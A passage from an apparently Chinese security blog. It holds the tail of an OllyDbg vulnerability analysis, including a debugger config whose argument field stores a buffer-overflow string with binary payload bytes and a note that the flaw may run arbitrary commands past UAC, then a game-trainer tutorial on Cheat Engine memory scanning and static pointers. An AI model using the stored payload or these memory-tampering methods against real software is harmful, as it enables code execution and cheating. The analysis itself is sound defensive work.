DLL=0</span><br><span class="line">Stop on DLL unload=0</span><br><span class="line">Stop on new thread=0</span><br><span class="line">Stop on thread end=0</span><br><span class="line">Stop on debug string=0</span><br><span class="line">Decode SSE registers=0</span><br><span class="line">Enable last error=1</span><br><span class="line">Ignore access violations in KERNEL32=1</span><br><span class="line">Ignore INT3=1</span><br><span class="line">Ignore TRAP=1</span><br><span class="line">Ignore access violations=1</span><br><span class="line">Step in unknown commands=1</span><br><span class="line">Ignore division by 0=1</span><br><span class="line">Ignore illegal instructions=1</span><br><span class="line">Ignore all FPU exceptions=1</span><br><span class="line">Warn when frequent breaks=0</span><br><span class="line">Warn when break not in code=0</span><br><span class="line">Autoreturn=0</span><br><span class="line">Save original command in trace=1</span><br><span class="line">Show traced ESP=1</span><br><span class="line">Show traced flags=1</span><br><span class="line">Animate over system DLLs=1</span><br><span class="line">Trace over string commands=0</span><br><span class="line">Synchronize CPU and Run trace=1</span><br><span class="line">Ignore custom exceptions=1</span><br><span class="line">Smart update=1</span><br><span class="line">Set high priority=1</span><br><span class="line">Append arguments=1</span><br><span class="line">Use ExitProcess=1</span><br><span class="line">Allow injection to get WinProc=0</span><br><span class="line">Sort WM_XXX by name=0</span><br><span class="line">Type of last WinProc breakpoint=0</span><br><span class="line">Snow-free drawing=0</span><br><span class="line">Demangle symbolic names=1</span><br><span class="line">Keep ordinal in name=1</span><br><span class="line">Only ASCII printable in dump=0</span><br><span class="line">Allow diacritical symbols=0</span><br><span class="line">String decoding=3</span><br><span class="line">Warn if not administrator=0</span><br><span class="line">Warn when terminating process=0</span><br><span class="line">Align dialogs=1</span><br><span class="line">Use font of calling window=0</span><br><span class="line">Specified dialog font=0</span><br><span class="line">Number of lines that follow EIP=0</span><br><span class="line">Restore window positions=1</span><br><span class="line">Restore width of columns=0</span><br><span class="line">Highlight sorted column=0</span><br><span class="line">Compress analysis data=1</span><br><span class="line">Backup UDD files=1</span><br><span class="line">Fill rest of command with NOPs=1</span><br><span class="line">Reference search mode=0</span><br><span class="line">Global search=1</span><br><span class="line">Aligned search=1</span><br><span class="line">Allow error margin=0</span><br><span class="line">Keep size of hex edit selection=1</span><br><span class="line">Modify tag of FPU register=1</span><br><span class="line">Hex inspector limits=1</span><br><span class="line">MMX display mode=0</span><br><span class="line">Last selected options card=5</span><br><span class="line">Last selected appearance card=3</span><br><span class="line">Ignore case in text search=1</span><br><span class="line">Letter key in Disassembler=1</span><br><span class="line">Looseness of code analysis=1</span><br><span class="line">Decode pascal strings=1</span><br><span class="line">Guess number of arguments=1</span><br><span class="line">Accept far calls and returns=1</span><br><span class="line">Accept direct segment modifications=1</span><br><span class="line">Decode VxD calls=1</span><br><span class="line">Accept privileged commands=1</span><br><span class="line">Accept I/O commands=1</span><br><span class="line">Accept NOPs=1</span><br><span class="line">Accept shifts out of range=1</span><br><span class="line">Accept superfluous prefixes=1</span><br><span class="line">Accept LOCK prefixes=1</span><br><span class="line">Accept unaligned stack operations=1</span><br><span class="line">Accept non-standard command forms=1</span><br><span class="line">Show ARG and LOCAL in procedures=1</span><br><span class="line">Save analysis to file=1</span><br><span class="line">Analyse main module automatically=1</span><br><span class="line">Analyse code structure=1</span><br><span class="line">Decode ifs as switches=1</span><br><span class="line">Save trace to file=0</span><br><span class="line">Trace contents of registers=1</span><br><span class="line">Functions preserve registers=0</span><br><span class="line">Decode tricks=1</span><br><span class="line">Automatically select register type=1</span><br><span class="line">Show decoded arguments=1</span><br><span class="line">Show decoded arguments in stack=1</span><br><span class="line">Show arguments in call stack=1</span><br><span class="line">Show induced calls=1</span><br><span class="line">Label display mode=0</span><br><span class="line">Label includes module name=1</span><br><span class="line">Highlight symbolic labels=1</span><br><span class="line">Highlight RETURNs in stack=1</span><br><span class="line">Ignore path in user data file=1</span><br><span class="line">Ignore timestamp in user data file=1</span><br><span class="line">Ignore CRC in user data file=1</span><br><span class="line">Default sort mode in Names=1</span><br><span class="line">Save out-of-module user data=0</span><br><span class="line">Tabulate columns in log file=0</span><br><span class="line">Append data to existing log file=0</span><br><span class="line">Flush gathered data to log file=0</span><br><span class="line">Skip spaces in source comments=1</span><br><span class="line">Hide non-existing source files=1</span><br><span class="line">Tab stops=8</span><br><span class="line">File graph mode=2</span><br><span class="line">Show internal handle names=0</span><br><span class="line">Hide irrelevant handles=0</span><br><span class="line">[Plugin ODbgScript]</span><br><span class="line">Restore Script window=0</span><br><span class="line">Restore Script Log=0</span><br><span class="line">BP_0001=</span><br><span class="line">恢复脚本窗口</span><br><span class="line">=0</span><br><span class="line">还原脚本日志</span><br><span class="line">=0</span><br><span class="line">恢复脚本窗口</span><br><span class="line">=0</span><br><span class="line">还原脚本日志</span><br><span class="line">=0</span><br><span class="line">恢复脚本窗口</span><br><span class="line">=0</span><br><span class="line">还原脚本日志</span><br><span class="line">=0</span><br><span class="line">恢复脚本窗口</span><br><span class="line">=0</span><br><span class="line">还原脚本日志</span><br><span class="line">=0</span><br><span class="line">恢复脚本窗口</span><br><span class="line">=0</span><br><span class="line">还原脚本日志</span><br><span class="line">=0</span><br><span class="line">还原脚本窗口=0</span><br><span class="line">还原脚本日志=0</span><br><span class="line">MRU1=C:\Users\lenovo\Desktop\od.txt</span><br><span class="line">MRU2=</span><br><span class="line">MRU3=</span><br><span class="line">MRU4=</span><br><span class="line">MRU5=</span><br><span class="line">ScriptDir=C:\Users\lenovo\Desktop\od.txt</span><br><span class="line">BP_FILE=C:\Users\lenovo\Desktop\od.txt</span><br><span class="line">[System]</span><br><span class="line">Options position=134,126</span><br><span class="line">Call DLL position=20,89</span><br><span class="line">[Plugin IDAFicator]</span><br><span class="line">Custom Scheme=0,8388608,32768,8421376,128,8388736,32896,12632256,8421504,16711680,65280,16776960,255,16711935,65535,16777215,12639424,15780004,15793151,10789024</span><br><span class="line">disableClickJmp=1</span><br><span class="line">DIA MAC x=0</span><br><span class="line">DIA MAC y=0</span><br><span class="line">DIA HWBP x=0</span><br><span class="line">DIA HWBP y=0</span><br><span class="line">Custom BP list=NonaWrite</span><br><span class="line">disasmCode=0</span><br><span class="line">PATH_RADASM=C:\吾爱破解专用版Ollydbg\plugin\minimalist-radasm</span><br><span class="line">PATH_HELP=C:\吾爱破解专用版Ollydbg\plugin\IDAFICATOR.hlp</span><br><span class="line">SETTINGS_MSEC=500</span><br><span class="line">DIA_CUSTOMIZE_SCHEME=0,8388608,32768,8421376,128,8388736,32896,12632256,8421504,16711680,65280,16776960,255,16711935,65535,16777215,12639424,15780004,15793151,10789024</span><br><span class="line">SETTINGS_MAIN=1,1,1,1,1</span><br><span class="line">SETTINGS_DUMP=</span><br><span class="line">SETTINGS_DISASM=1,0,0</span><br><span class="line">SETTINGS_STACK=</span><br><span class="line">SETTINGS_HWBP=0,0,0</span><br><span class="line">SETTINGS_ROTE=</span><br><span class="line">LAYOUT_ID=0</span><br><span class="line">LAYOUT_SWAP_DUMP_STACK=0</span><br><span class="line">SETTINGS_COMPILER=0</span><br><span class="line">DIA_ROTE_POS=-4,-4,1032,746</span><br><span class="line">MNU_PATHS_DIRS_N=0</span><br><span class="line">MNU_PATHS_FILES_N=0</span><br><span class="line">[Plugin 超级字串参考]</span><br><span class="line">Restore UStrRef Window=1</span><br><span class="line">[Placement]</span><br><span class="line">OllyTest=434,64,1219,623,1</span><br><span class="line">CPU=35,302,1027,472,3</span><br><span class="line">CPU subwindows=601,1459,595,1459,583,1155,518,1179</span><br><span class="line">超级字串参考=22,29,618,230,1</span><br><span class="line">Executable modules=0,0,162,45,1</span><br><span class="line">Memory map=0,0,162,45,1</span><br><span class="line">Log data=282,17,312,45,1</span><br><span class="line">Threads=0,0,162,45,1</span><br><span class="line">Windows=0,0,162,45,1</span><br><span class="line">Handles=132,16,547,437,1</span><br><span class="line">Patches=278,0,312,45,1</span><br><span class="line">Call stack=137,16,312,45,1</span><br><span class="line">Source=44,58,372,274,1</span><br><span class="line">References=0,0,162,45,1</span><br><span class="line">Breakpoints=0,0,162,45,1</span><br><span class="line">中文搜索引擎=278,38,312,57,1</span><br><span class="line">Call tree=0,0,312,45,1</span><br><span class="line">脚本运行窗口=193,89,201,45,1</span><br><span class="line">Watch expressions=99,37,540,230,1</span><br><span class="line">Source files=66,87,474,230,1</span><br><span class="line">Run trace=22,29,432,230,1</span><br><span class="line">SEH chain=88,116,270,230,1</span><br><span class="line">CPU subwindows 1=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 2=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 3=374,767,336,658,450,960,388,853</span><br><span class="line">CPU subwindows 4=374,767,336,658,450,960,388,853</span><br><span class="line">[Colours]</span><br><span class="line">Scheme[0]=10,12,18,0,5,15,13,13</span><br><span class="line">Scheme name[0]=Dave&#x27;s black</span><br><span class="line">Scheme[1]=1,5,0,18,7,18,4,12</span><br><span class="line">Scheme name[1]=Fancy Nico</span><br><span class="line">Scheme[2]=7,12,7,10,11,7,3,13</span><br><span class="line">Scheme name[2]=Kostya&#x27;s blue</span><br><span class="line">Scheme[3]=7,12,7,0,5,15,18,13</span><br><span class="line">Scheme name[3]=Dami&#x27;s black</span><br><span class="line">Scheme[4]=0,12,8,18,7,8,7,13</span><br><span class="line">Scheme name[4]=Scheme 4</span><br><span class="line">Scheme[5]=14,12,7,1,3,7,3,13</span><br><span class="line">Scheme name[5]=Scheme 5</span><br><span class="line">Scheme[6]=1,12,3,11,14,2,7,13</span><br><span class="line">Scheme name[6]=Scheme 6</span><br><span class="line">Scheme[7]=15,12,7,0,8,11,7,13</span><br><span class="line">Scheme name[7]=Scheme 7</span><br><span class="line">[Fonts]</span><br><span class="line">Font[0]=16,8,400,0,0,0,134,2,49,0</span><br><span class="line">Face name[0]=Terminal</span><br><span class="line">Font name[0]=OEM 等宽字体</span><br><span class="line">Font[1]=-12,0,400,0,0,0,134,1,49,0</span><br><span class="line">Face name[1]=新宋体</span><br><span class="line">Font name[1]=Terminal 6</span><br><span class="line">Font[2]=16,8,400,0,0,0,134,2,49,0</span><br><span class="line">Face name[2]=Fixedsys</span><br><span class="line">Font name[2]=系统等宽字体</span><br><span class="line">Font[3]=14,0,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[3]=Courier New</span><br><span class="line">Font name[3]=Courier (UNICODE)</span><br><span class="line">Font[4]=10,6,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[4]=Lucida Console</span><br><span class="line">Font name[4]=Lucida (UNICODE)</span><br><span class="line">Font[5]=9,6,700,0,0,0,255,0,48,0</span><br><span class="line">Face name[5]=Terminal</span><br><span class="line">Font name[5]=字体 5</span><br><span class="line">Font[6]=16,8,400,0,0,0,134,2,49,0</span><br><span class="line">Face name[6]=Fixedsys</span><br><span class="line">Font name[6]=字体 6</span><br><span class="line">Font[7]=14,0,400,0,0,0,1,2,5,0</span><br><span class="line">Face name[7]=Courier New</span><br><span class="line">Font name[7]=字体 7</span><br><span class="line">[Syntax]</span><br><span class="line">Commands[1]=10,7,12,12,14,12,12,13,96,7,14,0,0,0</span><br><span class="line">Operands[1]=1,7,7,7,13,14,10,11,0,0,0,0,0,0</span><br><span class="line">Scheme name[1]=Dave</span><br><span class="line">Commands[2]=1,1,1,1,1,1,1,4,109,12,12,0,0,0</span><br><span class="line">Operands[2]=1,1,2,4,12,2,2,5,0,0,0,0,0,0</span><br><span class="line">Scheme name[2]=Fancy Nico</span><br><span class="line">Commands[3]=14,4,124,124,9,110,64,13,111,8,12,0,0,0</span><br><span class="line">Operands[3]=1,10,4,13,11,13,15,6,0,0,0,0,0,0</span><br><span class="line">Scheme name[3]=Kostya&#x27;s xmas tree</span><br><span class="line">Commands[4]=7,7,2,12,6,12,10,13,96,7,14,0,0,0</span><br><span class="line">Operands[4]=1,7,7,7,13,7,10,11,0,0,0,0,0,0</span><br><span class="line">Scheme name[4]=Dami</span><br><span class="line">Commands[5]=0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[5]=0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[5]=No highlighting</span><br><span class="line">Commands[0]=0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Operands[0]=0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">Scheme name[0]=No highlighting</span><br><span class="line">[Arguments]</span><br><span class="line">Executable[1]=</span><br><span class="line">Executable[2]=</span><br><span class="line">Executable[3]=</span><br><span class="line">Executable[4]=</span><br><span class="line">Executable[5]=</span><br><span class="line">Executable[0]=</span><br><span class="line">[Appearance]</span><br><span class="line">CPU scheme=3</span><br><span class="line">CPU Disassembler=2,3,0,0,3</span><br><span class="line">CPU Dump=2,3,1,0,4353,0</span><br><span class="line">CPU Stack=2,3,0,0</span><br><span class="line">CPU Info=2,3,0,0</span><br><span class="line">CPU Registers=2,3,1,0</span><br><span class="line">超级字串参考=1,0,1,0,0</span><br><span class="line">Executable modules=1,0,1,0,0</span><br><span class="line">Memory map=1,0,1,0,0</span><br><span class="line">Log data=1,0,1,0,0</span><br><span class="line">Threads=1,0,1,0,0</span><br><span class="line">Windows=1,0,1,0,0</span><br><span class="line">Handles=1,0,1,0,0</span><br><span class="line">Patches=1,0,1,0,0</span><br><span class="line">Call stack=1,0,1,0,0</span><br><span class="line">Source=1,0,0,0,0</span><br><span class="line">References=1,0,1,0,0</span><br><span class="line">Breakpoints=1,0,1,0,0</span><br><span class="line">中文搜索引擎=1,0,1,0,0</span><br><span class="line">Call tree=1,0,1,0,0</span><br><span class="line">脚本运行窗口=1,0,1,0,0</span><br><span class="line">Watch expressions=1,0,1,0,0</span><br><span class="line">Source files=1,0,1,0,0</span><br><span class="line">Run trace=1,0,1,0,0</span><br><span class="line">SEH chain=1,0,1,0,0</span><br><span class="line">[Columns]</span><br><span class="line">CPU Disassembler=72,136,320,2048</span><br><span class="line">CPU Dump=72,384,136,</span><br><span class="line">CPU Stack=72,80,2048,</span><br><span class="line">超级字串参考=54,240,1536</span><br><span class="line">Executable modules=54,54,54,54,223,1536</span><br><span class="line">Memory map=54,54,54,54,72,30,48,48,1536</span><br><span class="line">Log data=54,1536</span><br><span class="line">Threads=54,54,66,108,60,54,72,72</span><br><span class="line">Windows=78,192,54,54,54,54,54,54,54,1536</span><br><span class="line">Handles=54,90,36,54,18,72,1536</span><br><span class="line">Patches=54,30,48,192,192,1536</span><br><span class="line">Call stack=54,54,216,168,54</span><br><span class="line">Source=48,1536</span><br><span class="line">References=54,240,1536</span><br><span class="line">Breakpoints=54,54,150,216,1536</span><br><span class="line">中文搜索引擎=54,240,1536</span><br><span class="line">Call tree=192,192,192,192</span><br><span class="line">脚本运行窗口=30,240,90,54,600</span><br><span class="line">Watch expressions=216,1536</span><br><span class="line">Source files=54,96,1536</span><br><span class="line">Run trace=54,54,54,54,192,1536</span><br><span class="line">SEH chain=54,192</span><br><span class="line">[Plugin StrongOD]</span><br><span class="line">CreateProcessMode=0</span><br><span class="line">HidePEB=1</span><br><span class="line">IsPatchFloat=1</span><br><span class="line">IsAdvGoto=0</span><br><span class="line">KernelMode=1</span><br><span class="line">KillPEBug=1</span><br><span class="line">SuperEnumMod=1</span><br><span class="line">AdvAttach=1</span><br><span class="line">SkipExpection=1</span><br><span class="line">OrdFirst=0</span><br><span class="line">BreakOnLdr=0</span><br><span class="line">BreakOnTls=1</span><br><span class="line">RemoveEpOneShot=1</span><br><span class="line">ShowBar=17</span><br><span class="line">LoadSym=0</span><br><span class="line">AutoUpdate=0</span><br><span class="line">HideWindow=1</span><br><span class="line">HideProcess=1</span><br><span class="line">ProtectProcess=1</span><br><span class="line">DriverKey=-514523012</span><br><span class="line">DriverName=Rockey5U</span><br><span class="line">UpdateURL=</span><br><span class="line">[Plugin 中文搜索引擎]</span><br><span class="line">Restore UStrRef Window=1</span><br><span class="line">[Import libraries]</span><br><span class="line">Implib[0]=C:\吾爱破解专用版Ollydbg\LIB\MFC42.Lib</span><br><span class="line">Implib[1]=C:\吾爱破解专用版Ollydbg\LIB\mfc42d.lib</span><br><span class="line">Implib[2]=C:\吾爱破解专用版Ollydbg\LIB\mfc42u.lib</span><br><span class="line">Implib[3]=C:\吾爱破解专用版Ollydbg\LIB\mfc42ud.lib</span><br><span class="line">Implib[4]=C:\吾爱破解专用版Ollydbg\LIB\mfc71.Lib</span><br><span class="line">Implib[5]=C:\吾爱破解专用版Ollydbg\LIB\mfc71d.lib</span><br><span class="line">Implib[6]=C:\吾爱破解专用版Ollydbg\LIB\mfc71u.lib</span><br><span class="line">Implib[7]=C:\吾爱破解专用版Ollydbg\LIB\mfc71ud.lib</span><br><span class="line">Implib[8]=C:\吾爱破解专用版Ollydbg\LIB\mfc80.lib</span><br><span class="line">Implib[9]=C:\吾爱破解专用版Ollydbg\LIB\mfc80d.lib</span><br><span class="line">Implib[10]=C:\吾爱破解专用版Ollydbg\LIB\mfc80u.lib</span><br><span class="line">Implib[11]=C:\吾爱破解专用版Ollydbg\LIB\mfc80ud.lib</span><br><span class="line">Implib[12]=C:\吾爱破解专用版Ollydbg\LIB\mfcd42d.lib</span><br><span class="line">Implib[13]=C:\吾爱破解专用版Ollydbg\LIB\mfcd42ud.lib</span><br><span class="line">Implib[14]=C:\吾爱破解专用版Ollydbg\LIB\mfcn42d.lib</span><br><span class="line">Implib[15]=C:\吾爱破解专用版Ollydbg\LIB\mfcn42ud.lib</span><br><span class="line">Implib[16]=C:\吾爱破解专用版Ollydbg\LIB\mfco42d.lib</span><br><span class="line">Implib[17]=C:\吾爱破解专用版Ollydbg\LIB\mfco42ud.lib</span><br><span class="line">Implib[18]=C:\吾爱破解专用版Ollydbg\LIB\MSVBVM50.lib</span><br><span class="line">Implib[19]=C:\吾爱破解专用版Ollydbg\LIB\msvbvm60.lib</span><br><span class="line">Implib[20]=C:\吾爱破解专用版Ollydbg\LIB\msvcp60.lib</span><br><span class="line">Implib[21]=C:\吾爱破解专用版Ollydbg\LIB\msvcp71.lib</span><br><span class="line">Implib[22]=C:\吾爱破解专用版Ollydbg\LIB\msvcp80.lib</span><br><span class="line">Implib[23]=C:\吾爱破解专用版Ollydbg\LIB\MSVCR70.lib</span><br><span class="line">Implib[24]=C:\吾爱破解专用版Ollydbg\LIB\msvcr71.lib</span><br><span class="line">Implib[25]=C:\吾爱破解专用版Ollydbg\LIB\msvcr80.lib</span><br><span class="line">Implib[26]=C:\吾爱破解专用版Ollydbg\LIB\msvcrt.lib</span><br><span class="line">Implib[27]=C:\吾爱破解专用版Ollydbg\LIB\comctl32.lib</span><br><span class="line">Implib[28]=C:\吾爱破解专用版Ollydbg\LIB\dbgeng.lib</span><br><span class="line">Implib[29]=C:\吾爱破解专用版Ollydbg\LIB\dbghelp.lib</span><br><span class="line">Implib[30]=C:\吾爱破解专用版Ollydbg\LIB\kernel32.lib</span><br><span class="line">Implib[31]=C:\吾爱破解专用版Ollydbg\LIB\ntdll.lib</span><br><span class="line">Implib[32]=C:\吾爱破解专用版Ollydbg\LIB\oleaut32.lib</span><br><span class="line">Implib[33]=C:\吾爱破解专用版Ollydbg\LIB\oledlg.lib</span><br><span class="line">Implib[34]=C:\吾爱破解专用版Ollydbg\LIB\ollydbg.lib</span><br><span class="line">Implib[35]=C:\吾爱破解专用版Ollydbg\LIB\ws2_32.lib</span><br><span class="line">Implib[36]=C:\吾爱破解专用版Ollydbg\LIB\wsock32.lib</span><br><span class="line">[Plugin ILLY]</span><br><span class="line">AutoRun=0</span><br><span class="line">[参数]</span><br><span class="line">参数[0]=123123</span><br><span class="line">参数[1]=&quot;&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAo\CAAAAAAAAAAAAAAAA谏浸鐜_賢$鬪)杀11n冾?n?&#123;ｚH刓?顾lj蓒]鵁w?Zy;パ_r6I?磹瘐匷髀囦蘙Zg砚??翗蒳?HC/糠蹠i?9T&#x27;證悘6桁礎/廰谴7??夷僲既《魺D&#125;踒??鋫n3鰉螒|?ㄞ哨&gt;e枯@f锏q韅翇$?l??d蒖&lt;睮W糀Q?瘴?梆`憭绯y&#123;??&quot;&quot;</span><br><span class="line">Argument[1]=1</span><br><span class="line">Argument[0]=123123</span><br><span class="line">[Exceptions]</span><br><span class="line">Custom[0]=00000000,FFFFFFFF</span><br></pre></td></tr></table></figure></div>



<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>在 win7 以上的系统使用 OD 之前需要允许 UAC，似乎可以使用漏洞基于调试器绕过 UAC 执行任意命令。</p>
<p>但是综合来看触发漏洞的条件较为苛刻，总体利用价值不算特别高。</p>
<p>平时使用 OD 的时候尽量不要使用参数功能，必须使用的时候先点击下拉菜单看看有没有特别奇怪的参数。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>简单的游戏修改器实现</title>
    <url>/2020/02/23/game_trainer1/</url>
    <content><![CDATA[<p>如何实现一个最简单的游戏修改器？</p>
<span id="more"></span>

<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>闲来无事简单学习一下游戏修改器的原理。</p>
<p>修改器大致分为两种，一种是外部的，即修改器进程独立于游戏进程之外运行，通过某些系统 API 实现对游戏的修改。另一种是内部的，修改器通过特殊手段把自己注入游戏进程中，直接访问和操作游戏数据。</p>
<p>两种方式各有优缺点，外部修改器比较稳定，无需对游戏的内存数据进行大范围变动，但是其使用 API 和游戏进行通信，效率较低，响应速度较慢。</p>
<p>内部修改器需要将代码注入到游戏进程中，注入后以新的线程方式直接存取内存数据，在效率上更好，响应速度更快，但是对游戏内存有较大的改动，不是很稳定。不过大部分情况下两者差别不大，无论哪种技术，只要能够达成修改的目的即可。</p>
<p>修改器的基本思路：</p>
<ol>
<li>找到想要修改的数据</li>
<li>修改</li>
<li>查看结果</li>
</ol>
<h2 id="如何寻找想要修改的数据？"><a href="#如何寻找想要修改的数据？" class="headerlink" title="如何寻找想要修改的数据？"></a>如何寻找想要修改的数据？</h2><p>游戏也是软件，我们想要修改的数据一定位于内存的某个地址中。</p>
<p>工具：Cheat Engine 或其他内存搜索 &amp; 修改工具</p>
<p>游戏中所有参数都有其对应的数据结构，例如血量可能用 int，移动速度可能用 double 等。并且这些数据不一定要准确的显示在屏幕上，很多游戏中使用了进度条和其他形式来表示有关数据，血量有血条，移动速度只能感知出来等等。要想找到这些数据，需要用到很多不同的方法。其中最为常用的就是未知初始值 &amp; 增加&#x2F;减小值搜索。</p>
<p>CE 自带很多搜索数据的方法，例如具有血条的 BOSS，就可以先搜索未知的初始值，然后攻击减少血量，再搜索减小的值，一步步找到真正的数据。对于体量较大的游戏，采用了大型引擎开发，那么相关数据结构会比较混乱，单纯使用 CE 很难定位实际数据的地址。此时需要结合逆向分析，找到相关程序代码才能顺利定位数据位置。</p>
<p><strong>举个例子</strong></p>
<p>比较简单的游戏定位数据。这里用到的样本是 AssaultCube，是基于 Cube 引擎开发的开源第一人称射击游戏，此游戏内部数据结构比较简单，我们先拿它开刀。</p>
<p>打开游戏，默认会来到训练模式，此时需要在选项菜单中选择单人模式。(原因是训练模式和正常游戏所用到的数据很可能不是同一套)</p>
<p>进入游戏我们可以看到人物的基本信息。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-1.png"
                     
                ></p>
<p>基本信息包括血量、枪械子弹数量。简单游玩发现角色还可以装备防弹衣，也就是存在护甲值，另外还有手榴弹等投掷武器的存在。</p>
<p>CE 搜索数据非常简单，只需要附加到进程，然后搜索确切的数值，接着在游戏中修改数值，反复搜索，直到剩下的地址条目很少，基本就定位到了正确的数据。</p>
<p>接着可以直接进行修改查看效果，关于 CE 查找游戏数据有很多详细的教程，推荐先完成 CE 自带的教程程序，这样能对它有一个全面的了解。</p>
<p>我们可以做一个小实验，记录下第一次找到的数据所在地址，然后退出游戏，重新打开游戏并找到相同的数据所在地址，你会发现两次得到的数据地址是不同的，原因是现代操作系统都存在 ASLR，即地址布局随机化技术，程序每次运行的时候都会被加载到不同的地址空间，这样能够缓解一些漏洞对于系统的损害。</p>
<p>但是这给我们修改游戏数据带来了一些困难，虽然使用 CE 能够定位到游戏数据，但是每次重新启动游戏都需要按照相同的步骤重新找到数据所在地址，有没有什么好方法能够一劳永逸呢？</p>
<p>答案就是静态指针，现代游戏一般体量都很大，内部逻辑也非常复杂，游戏可能被分为几十个模块，为了方便模块之间相互访问数据，一般都会存在全局静态指针指向某些关键数据，例如游戏主角。</p>
<p>静态数据虽然也会受到 ASLR 的影响，但它有一个很重要的特点，相对模块基址偏移固定，程序每次加载之后我们可以通过技术手段确定每个模块的地址，因此可以根据固定的偏移量找到对应的静态指针。</p>
<p>一般来说，我们能够找到的游戏数据都会有一个静态指针与之对应，这是面向对象开发模式的特性，开发者通常会将游戏中的角色、道具编写成类，类中包含和此对象有关的数据，例如主角有血量和护甲值，开发者很可能会将它们写在同一个类中，因此我们找到血量，那么剩余数据基本就分布在血量内存附近。</p>
<h2 id="修改器开发实例"><a href="#修改器开发实例" class="headerlink" title="修改器开发实例"></a>修改器开发实例</h2><p>我们以<strong>挺进地牢</strong>这款游戏为例，简单演示一下修改器的基本开发技巧。</p>
<p>首先，游戏修改器通常使用 C++ 来开发，这是由于 C++ 可以像 C 语言一样直接使用 Windows 提供的 API，但在 C 语言基础上又多出了面向对象的概念。C# 通常也可以用于修改器开发，但是 C# 想要调用底层 API 需要使用委托等较复杂的技术，另外 C# 中没有了指针的概念，某些操作上可能没有 C++ 灵活。</p>
<p>修改器需要实现的基本功能：</p>
<ol>
<li>能够附加到目标进程</li>
<li>能够读取目标进程指定内存地址的数据</li>
<li>能够写入目标进程指定内存地址的数据</li>
<li>如果是内部修改器，需要将自身代码注入到目标进程中</li>
<li>绕过反作弊？</li>
</ol>
<p>选择人物，进入地牢之后可以看到角色拥有几个基本属性：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-2.png"
                     
                ></p>
<p>分别是血量、空响弹(游戏中的一种特殊道具)、钥匙以及金钱。首先查找血量所在的地址，简单游玩之后可以发现每次受到伤害，血量会减少一半：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-3.png"
                     
                ></p>
<p>我们可以猜测此游戏的血量有两种保存方式，一是使用整数，即初始血量为 6，每次受伤减一。另外还可以使用浮点数形式保存，初始值为 3.0，每次受伤减少 0.5。</p>
<p>经过搜索，游戏的血量是 float 型保存的，即初始 3.0。</p>
<p>那么在 CE 中查找确切的值，float 类型，重复搜索，最后能够找到一个地址：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-4.png"
                     
                ></p>
<p>双击此地址可将它保存到下方表格中，双击 value 可以修改它的值，例如我们修改成 3 ，回到游戏会发现血量回满。因此这个地址保存的数值就是主角的生命值。</p>
<p>根据前面的介绍，这个地址很有可能只是一个动态地址，每次重新启动游戏都不同。你可以自己尝试重启游戏试验一下，实际上 CE 中自带了检测地址是否为动态地址的功能，在地址列表中所有黑色的地址都是动态的，而静态地址会以绿色表示(所谓静态地址就是相对模块偏移量固定的地址)。</p>
<p>现在我们找到了生命值所在的动态地址，那么如何才能找到它的静态地址呢？</p>
<p><strong>最原始的方法</strong>：</p>
<p>右键点击这个地址，选择 find what access this address 选项，CE 会自动附加一个调试器到游戏上，并且在目标地址添加一个硬件访问断点，之后所有访问了这个数据的指令都会被记录下来。</p>
<p>附加之后我们在游戏中故意受到伤害，会发现有几条指令访问了血量这个地址：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-5.png"
                     
                ></p>
<p>这些指令的访问次数各不相同，第一条指令访问非常频繁，而后面的指令只有在角色受伤之后才被加载出来。</p>
<p>考虑到血量在内存中只是一串数字，只有绘制到屏幕上才能给玩家直观的感受。游戏的画面每秒钟会绘制上百次，以此来形成流畅的显示效果。所以一定有某个函数负责重绘画面，在绘制过程中就要访问到相关数据。</p>
<p>而后面的指令很可能就和游戏逻辑有关了。例如有判断子弹和角色碰撞的代码，或是专门负责控制血量的代码等等，具体要看开发者怎么定义了。</p>
<p>不过所有指令都有一个规律，它们访问的地址都是 [xxx + 118] 这种形式，实际上这是指针解引用的汇编代码，xxx 寄存器中保存的是某个游戏对象的指针，在指针偏移 0x118 位置处保存着玩家的血量数据。翻译成代码应该如下</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Player</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// xxx 数据</span></span><br><span class="line">    <span class="type">float</span> health;   <span class="comment">// 偏移 0x118 位置</span></span><br><span class="line">    <span class="comment">// xxx 数据</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">// xxxx  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那么是不是 xxx 寄存器中保存的数值就是静态地址呢？我们可以选中某条指令找到寄存器中的数据，在 CE 中以 hex 形式搜索，能够找到很多结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/game_trainer-6.png"
                     
                ></p>
